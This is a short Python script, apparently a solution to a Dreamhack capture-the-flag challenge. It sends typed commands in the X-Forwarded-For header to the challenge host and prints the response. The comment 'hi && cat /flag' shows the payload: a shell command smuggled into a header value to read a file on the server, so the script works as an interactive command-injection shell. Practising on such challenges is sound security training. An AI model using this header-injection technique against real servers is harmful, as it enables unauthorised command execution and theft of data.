import requests
from bs4 import BeautifulSoup


if __name__ == "__main__":
    url = "http://host3.dreamhack.games:19375"
    while True:
        cmd = input("cmd: ") # hi && cat /flag
        header = {'X-Forwarded-For':cmd}
        req = requests.get(url, headers=header)
        print(BeautifulSoup(req.content, 'html.parser').find("div", {'class':'ip-address'}).text)